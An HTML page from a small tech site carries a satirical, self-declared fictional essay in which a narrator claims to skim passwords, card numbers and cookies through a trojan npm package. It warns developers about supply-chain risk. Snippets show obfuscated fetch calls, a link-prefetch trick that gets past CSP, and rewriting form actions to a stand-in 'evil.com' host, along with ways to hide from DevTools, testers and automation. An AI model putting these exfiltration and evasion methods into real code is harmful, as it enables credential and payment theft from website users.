@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" href="../../css/Layout.css" />
+    <link rel="stylesheet" href="../../css/articles.css" />
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet" />
+    <link
+      rel="stylesheet"
+      href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"
+    />
+    <link rel="icon" href="../../img/icon/log2.png" type="image/x-icon" />
+    <!--Fonts-->
+    <link
+      href="https://fonts.googleapis.com/css?family=Alegreya Sans SC"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Sansita+Swashed:wght@300&family=Source+Sans+Pro&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Josefin+Sans:ital,wght@1,500&display=swap"
+      rel="stylesheet"
+    />
+    <script
+      src="https://kit.fontawesome.com/9ccb26cf81.js"
+      crossorigin="anonymous"
+    ></script>
+
+    <!--Fonts-->
+    <!-- jQuery library -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+    <!-- Latest compiled JavaScript -->
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/particlesjs/2.2.3/particles.min.js"></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/2.5.2/umd/popper.min.js"
+      integrity="sha512-Jen3K+iRN4thSYDEyHwUGYFxNslAUCTV9P/g0k836eaoq/tplAUCzRPUyDxKUjBlKdJhamW7S3u7NWSGEEdIQw=="
+      crossorigin="anonymous"
+    ></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/particlesjs/2.2.2/particles.min.js"></script>
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <title>TechnoJitsu</title>
+  </head>
+
+  <body>
+  <!-- horizontal navbar -->
+  <nav class="navbar navbar-default" id="mNavbar">
+    <div class="container-fluid" id="navtop">
+      <div class="navbar-header">
+        <a id="txtdeco" href="../../TechNoJitsu.html">
+          <img
+            class="img img-rounded imgstat"
+            alt="Navbar_logo"
+            src="../../img/icon/Log.png"
+            width="50"
+            height="50"
+            class="d-inline-block align-top"
+          />
+        </a>
+        <span><a id="head" href="../../TechNoJitsu.html">TechnoJitsu</a></span>
+      </div>
+      <ul class="nav navbar-nav navbar-right">
+        <li class="vline">
+          <a href="../../html/Projects/projectsMain.html">PROJECTS</a>
+        </li>
+        <li><a href="../../html/Articles/ArticlesMain.html">ARTICLES</a></li>
+        <li><a href="../../html/Languages/LangGuide.html">LANG-GUIDES</a></li>
+        <li class="vline">
+          <a href="../../html/FORMS/sign_up.html" class="LoGup" 
+            ><span class="glyphicon glyphicon-user"></span> Sign Up</a
+          >
+        </li>
+        <li>
+          <a href="../../html/FORMS/sign_in.html" class="LoGin" onclick="logCheck()"
+            ><span class="glyphicon glyphicon-log-in "></span> Login</a
+          >
+        </li>
+      </ul>
+    </div>
+  </nav>
+  <!-- horizontal navbar -->
+  
+    <div class="container ArtMain">
+    <div class="container">
+<h1 class="artTextCont">Phishing Credit Details:</h1>
+<p> The following is a true story or an anecdote. Or maybe it’s just based on a true story. Perhaps it’s not true at all.</p>
+<p>
+<p>It’s been a frantic week of security scares — it seems like every day there’s a new vulnerability. It’s been a real struggle 
+    for me personally to pretend like I understand what’s going on when asked about it by family members.</p>
+<p>Seeing people close to me get all flustered at the prospect of being “powned” has really put things in perspective for me.</p>
+    So, it is with a heavy heart that I’ve decided to come clean and tell you all how I’ve been stealing usernames, passwords and 
+    credit card numbers from your sites for the past few years.</p>
+<p>The malicious code itself is very simple, it does its best work when it runs on a page that meets the following criteria:
+    <ul>
+        <li>The page has a <strong>&lt;form&gt;</strong></li>
+        <li>an element matches <strong>input[type="password"]</strong> or <strnog>name="cardnumber"</strnog> or <strong>name="cvc" </strong>etc.</li>
+        <li>The page contains words like “credit card”, “checkout”, “login”, “password” etc.</li>
+    </ul>
+</p>
+<p>Then, when there’s a blur event on a password/credit card field, or a form <strong>submit</strong> event is heard, my code:
+    <ul>
+        <li>Takes data from all form fields <strong>(document.forms.forEach(…))</strong> on the page</li>
+        <li>Grabs <strong>document.cookie</strong></li>
+        <li>It turns all that into a random looking string <strong>const payload = btoa(JSON.stringify(sensitiveUserData))</strong></li>
+        <li>Then sends it off to <strong>`https://legit-analytics.com?q=${payload}`</strong> (not the real domain, of course)</li>
+    </ul>
+    In short, if it looks like data that might be even remotely valuable to me, I send it off to my server.
+</p>
+<div>
+    <p>Of course, when I first wrote this code, back in 2015, it was of no use at all sitting on my computer. 
+        I needed to get it out into the world. Out into your site.</p>
+    <p>In some wise words from Google:</p>
+       <blockquote>If an attacker successfully injects any code at all, it’s pretty much game over</blockquote>
+    <p>XSS is too small scale, and really well protected against.</p>
+    <p>Chrome Extensions are too locked down.</p>
+    <p>Lucky for me, we live in an age where people install npm packages like they’re popping pain killers.</p>
+</div>
+<div>
+    <p>So, npm was to be my distribution method. I would need to come up with some borderline-useful package that people would install
+        without thinking — my Trojan horse.</p>
+    <p>People love pretty colours — it’s what separates us from dogs — so I wrote a package that lets you log to the console in any colour.
+        I was excited at this point — I had a compelling package — but I didn’t want to wait around while people slowly discovered it and 
+        spread the word. So I set about making PRs to existing packages that added my colourful package to their dependencies.</p>
+    <p>I’ve now made several hundred PRs (various user accounts, no, none of them as “David Gilbertson”) to various frontend packages and their
+        ndencies. “Hey, I’ve fixed issue x and also added some logging.”</p>
+    <p>Look ma, I’m contributing to open source!</p>
+    <p>There are a lot of sensible people out there that tell me they don’t want a new dependency, but that was to be expected, 
+        it’s a numbers game.</p>
+    <p>Overall, the campaign has been a big success and my colourful console code is now directly depended on by 23 packages. 
+        One of those packages is itself depended upon by a pretty widely used package — my cash cow. I won’t mention any names, 
+        but you could say it’s left-padding the coffers.</p>
+    <p>And this is just one package. I have 6 more on the boil.</p>
+    <p>I’m now getting about 120,000 downloads a month, and I’m proud to announce, my nasty code is executing daily on thousands of sites,
+        including a handful of Alexa-top-1000 sites, sending me torrents of usernames, passwords and credit card details.</p>
+</div>
+
+<div>
+    <p>Looking back on these golden years, I can’t believe that people exert so much effort messing around with cross-site scripting 
+        just to get code into a single site. It’s so easy to ship malicious code to thousands of websites, with a little help from my 
+        web developer friends.</p>
+    <h2>Some objections you might have to my blatant fear mongering…</h2>
+    <h3>I’d notice the network requests going out!</h3>
+    <p>Where would you notice them? My code won’t send anything when the DevTools are open (yes even if un-docked).</p>
+    <p>I call this the Heisenberg Manoeuvre: by trying to observe the behaviour of my code, you change the behaviour of my code.</p>
+    <p>It also stays silent when running on localhost or any IP address, or where the domain contains dev, test, qa, uat or staging 
+        (surrounded by \b word boundaries).</p>
+    <h3>Our penetration testers would see it in their HTTP request monitoring tools!</h3>
+    <p>What hours do they work? My code doesn’t send anything between 7am and 7pm weekdays. It halves my haul, but 95% reduces my chances 
+        getting caught.</p>
+    <p>And I only need your credentials once. So after I’ve sent a request for a device I make a note of it (local storage and cookies) 
+        and never send for that device again. Replication is not made easy.</p>
+    <p>Even if some studious little pen tester clears cookies and local storage constantly (on the weekends), I only send these requests 
+        intermittently (about one in seven times, lightly randomised — the ideal trouble-shooting-insanity-inducing frequency).</p>
+    <p>Also the URL looks a lot like the 300 other requests to ad networks your site makes.</p>
+    <p>Maybe you’ve got an automated setup filling out payment forms 24/7 and checking for suspect network requests. Good on ya. Are you 
+        using PhantomJS, Selenium, WebDriver or friends? Sorry, they all add easily detectable properties to window so I won’t be sending 
+        anything out for these setups.</p>
+    <p>The point is, just because you don’t see it, doesn’t mean it’s not happening. It’s been more than two years and as far as I 
+        know, no one has ever noticed one of my requests. Maybe it’s been in your site this whole time :)</p>
+    <p>(Fun fact, when I go through all the passwords and credit card numbers I’ve collected and bundle them up to be sold on the 
+        dark web, I have to do a search for my credit card numbers and usernames in case I’ve captured myself. Isn’t that funny!)</p>
+</div>
+<div>
+        <h3>I’d see it in your source on GitHub!</h3>
+        <p>Your innocence warms my heart.</p>
+        <p>But I’m afraid it’s perfectly possible to ship one version of your code to GitHub and a different version to npm.</p>
+        <p>In my package.json I’ve defined the files property to point to a lib directory that contains the minified, uglified nasty 
+            code — this is what npm publish will send to npm. But lib is in my .gitignore so it never makes its way to GitHub. 
+            This is a pretty common practice so it doesn’t even look suspect if you read through these files on GitHub.</p>
+        <p>This is not an npm problem, even if I’m not delivering different code to npm and GitHub, who’s to say that what you see in 
+            /lib/package.min.js is the real result of minifying /src/package.js?</p>
+        <p>So no, you won’t find my nasty code anywhere on GitHub.</p>
+        <h3>I read the minified source of all code in node_modules!</h3>
+        <p>OK now you’re just making up objections. But maybe you’re thinking you could write something clever that automatically checks
+             code for anything suspicious.</p>
+        <p>You’re still not going to find much that makes sense in my source, I don’t have the word fetch or XMLHttpRequest anywhere, or the 
+            domain that I’m sending to. My fetch code looks like this:
+           <pre>const i = 'gfudi';
+        const k = s => s.split('').map(c => String.fromCharCode(c.charCodeAt() - 1)).join('');
+        self[k(i)](urlWithYourPreciousData);</pre></p>
+        <p>“gfudi” is just “fetch” with each letter shifted up by one. Hard core cryptography right there. self is an alias for window.</p>
+        <p>self['\u0066\u0065\u0074\u0063\u0068'](...) is another fancy way of saying fetch(...).</p>
+        <p>The point: it is very difficult to spot shenanigans in obfuscated code, you’ve got no chance.</p>
+        <p>(With all that said, I don’t actually use anything as mundane as fetch, I prefer new EventSource(urlWithYourPreciousData) where 
+            possible. That way even if you’re being paranoid and monitoring outbound requests by using a serviceWorker to listen to fetch 
+            events, I will slink right by. I simply don’t send anything for browsers that support serviceWorker but not EventSource.)</p>
+        <h3>I have a Content Security Policy!</h3>
+        <p>Oh, do you now.</p>
+        <p>And did somebody tell you that this would prevent malicious code from sending data off to some dastardly domain? I hate to be the 
+            bearer of bad news, but the following four lines of code will glide right through even the strictest content security policy.</p>
+        <pre>const linkEl = document.createElement('link');
+        linkEl.rel = 'prefetch';
+        linkEl.href = urlWithYourPreciousData;
+        document.head.appendChild(linkEl);</pre>
+        <p>(In an earlier iteration of this post I said that a solid content security policy would keep you (and I quote) “100% safe”. 
+            Unfortunately 130k people read that before I learned the above trick. So I guess the lesson there is that you can’t trust any 
+            thing or any one on the internet.)</p>
+        <p>But CSPs aren’t completely unhelpful. The above only works in Chrome, and a decent CSP might block my efforts in some lesser-used 
+            browsers.</p>
+        <p>If you don’t know already, a content security policy can restrict what network requests can be made from the browser. It is designed 
+            restrict what you can bring into the browser, but can also — as a side effect — limit the ways in which data can be sent out 
+            (when I ‘send’ passwords to my server, it’s just a query param on a get request).</p>
+        <p>In the event that I can’t get data out using the prefetch trick, CSPs are tricky for my credit card collection corporation. 
+            And not just because they neuter my nefarious intentions.</p>
+        <p>You see, if I try to send data out from a site that has a CSP, it can alert the site owner of the failed attempt 
+            (if they’ve specified a report-uri). They would eventually track this down to my code and probably call my mother and then I 
+            would be in big trouble.</p>
+        <p>Since I don’t want to draw attention to myself (except when on the dance floor) I check your CSP before attempting to send something out.</p>
+        <p>To do this, I make a dummy request to the current page and read the headers.</p>
+        <pre>fetch(document.location.href)
+        .then(resp => {
+        const csp = resp.headers.get('Content-Security-Policy');
+        // does this exist? Is is any good?
+        });</pre>
+        <p>At this point I can look for ways to get out past your CSP. The Google sign in page has a CSP that would allow me to easily send 
+            out your username and password if my code ran on that page. They don’t set connect-src explicitly and also haven’t set the 
+            catch-all default-src so I can send your credentials wherever I damn well please.</p>
+        <p>If you send me $10 in the mail I’ll tell you if my code is running on the Google sign in page.</p>
+        <p>Amazon has no CSP at all on the page where you type your credit card number in, nor does eBay.</p>
+        <p>Twitter and PayPal have CSPs, but it’s still dead easy to get your data from them. These two allow behind-the-scenes sending 
+            of data in the same way, and this is probably a sign that others allow it as well. At first glance everything looks pretty 
+            thorough, they both set the default-src catch-all like they should. But here’s the kicker: that catch-all doesn’t catch all.
+             They haven’t locked down form-action.</p>
+        <p>So, when I’m checking your CSP (and checking it twice), if everything else is locked down but I don’t see form-action in there, 
+            I just go and change the action (where the data is sent when you click ‘sign in’) on all your forms.</p>
+        <pre>Array.from(document.forms).forEach(formEl => formEl.action = `//evil.com/bounce-form`);</pre>
+        <p>Boom, thanks for sending me your PayPal username and password, pal. I’ll send you a thank you card with a photo of the stuff I 
+            bought with your money.</p>
+        <p>Naturally, I only do this trick once per device and bounce the user right back to the referring page where they will shrug and 
+            try again.</p>
+        <p>(Using this method, I took over Trump’s Twitter account and started sending out all sorts of weird shit. As yet no one has noticed.)</p>
+        
+</div>
+<div>
+    <h2>OK I am sufficiently concerned, what can I do?</h2>
+    <p>Option 1:<br><br>
+    <p>On any page that collects any data that you don’t want me (or my fellow attackers) to have, don’t use npm modules. Or Google Tag Manager, or ad networks, or analytics, or any code that isn’t yours.</p>
+    <p>As suggested here, you might want to consider having dedicated, lightweight pages for login and credit card collection that are served up in an iFrame.</p>
+    <p>You can still have your big ol’ React app with 938 npm packages for the header/footer/nav/whatever, but the part of the page where
+         the user is typing should be in a secured iFrame and it should run only hand-crafted (and may I suggest, not-minified) JavaScript
+          — if you want to do client-side validation.</p>
+    </p>
+</div>
+<div>
+<h2>A serious note</h2>
+<p>I know that sometimes my relentless sarcasm can be difficult to unravel by people on the English-learning path (and also people 
+    in need of lightening up). So just to be clear, I have not created an npm package that steals information. <strong>This post is entirely fictional,</strong> 
+    altogether plausible, and I hope at least a little educational.</p>
+<p>Although this is all made up, it worries me that none of this is hard.</p>
+<p>There’s no shortage of smart, nasty people out there, and 580,000 npm packages. It seems to me that the odds are better than even 
+    that at least one of those packages has some malicious code in it, and that if it’s done well, you would never even know.</p>
+<p>And here’s an interesting thought experiment: I wrote an npm package last week, a little easing function. Totally unrelated to this
+     post and I give you my word as a gentleman that there is nothing malicious in there. How nervous would you be adding that to your 
+     site?</p>
+</div>
+
+
+    </div>
+    </div>
+    <!--Footer-->
+        <footer class="footer-content">
+          <div class="jumbotron text-md-left">
+            <span class="ribbonfootz"
+              ><span class="ribbonfoot footer-text">Get In Touch!</span></span
+            >
+            <div class="row">
+              <div class="col-md-5">
+                <img src="../../img/icon/Log.png" alt="footer-img" id="footer-img" />
+    
+                <h3 class="footer-text text-left">TechNoJitsu:</h3>
+                <p id="footercontent">
+                  Technojitsu is an interactive, ever growing platform to design and
+                  develop projects, to acquire new and essential tech aspects
+                  without leaving behind the essential building blocks i.e.
+                  languages . All in all a tech pill to enhance and channel your
+                  creative & reasoning mind in the right output stream.
+                </p>
+              </div>
+    
+              <div class="col-md-2 " id="footert">
+                <h4 class="text-uppercase text-left  footCol">Projects</h4>
+                <ul class="list-unstyled text-left">
+                  <li>
+                    <a href="../../html/Projects/Arduino/EMO project.html">EMO Display</a>
+                  </li>
+                  <li>
+                    <a
+                      href="../../html/Projects/Arduino/4x3 input keypad with matrix display.html"
+                      >Input Keypad with Led Matrix display
+                    </a>
+                  </li>
+                  <li>
+                    <a href="../../html/Projects/Arduino/Joystick module.html"
+                      >Joystick module</a
+                    >
+                  </li>
+                  <li>
+                    <a href="../../html/Projects/Arduino/LCD display.html">LCD Display</a>
+                  </li>
+                </ul>
+              </div>
+              <div class="col-md-2 ">
+                <h4 class="text-uppercase text-left  footCol">Articles</h4>
+                <ul class="list-unstyled text-left">
+                  <li><a href="../../html/Articles/Penetration Testing.html">Penetration Testing</a></li>
+                  <li><a href="../../html/Articles/Phishing Security.html">Phishing Security</a></li>
+                  <li><div style="color: #337ab7;">Coming Soon!</div></li>
+                </ul>
+              </div>
+              <div class="col-md-2">
+                <h4 class="text-uppercase text-left  footCol">Language Guides</h4>
+                <ul class="list-unstyled text-left">
+                  <li><a href="../../html/Languages/C/intro/historyofc.html">C</a></li>
+                  <li><a href="../../html/Languages/C++/intro/HistoryofC++.html">C++</a></li>
+                  <li><div style="color: #337ab7;">Java(Coming Soon!)</div></li>
+                </ul>
+              </div>
+            </div>
+            <div class="row" id="footerLinksTxt">
+              <div class="col-md-7" id="footerLinksTxt">
+                <p class="footer-text">Share your thoughts, and leave a Like</p>
+              </div>
+              <div class="col-md-5" id="footerLinks">
+                <p class="text-left">
+                  <a
+                    href="https://facebook.com/"
+                    class="social-round-icon orange-round-icon fa-icon"
+                    title=""
+                  >
+                    <i class="fa fa-facebook" aria-hidden="true"></i>
+                  </a>
+                  <a
+                    href="https://twitter.com/"
+                    class="social-round-icon orange-round-icon fa-icon"
+                    title=""
+                  >
+                    <i class="fa fa-twitter" aria-hidden="true"></i>
+                  </a>
+                  <a
+                    href="https://www.linkedin.com/"
+                    class="social-round-icon orange-round-icon fa-icon"
+                    title=""
+                  >
+                    <i class="fa fa-linkedin" aria-hidden="true"></i>
+                  </a>
+                </p>
+              </div>
+            </div>
+          </div>
+    
+          <div class="footer-copyright text-center" id="cpyrgt">
+            © 2020 Copyright:
+            <a href="../../html/TechNoJitsu.html"> TechNoJitsu.com</a>
+          </div>
+        </footer>
+        <!--Footer-->
+        <script>
+          AOS.init();
+        </script>
+      </body>
+    </html>
+    
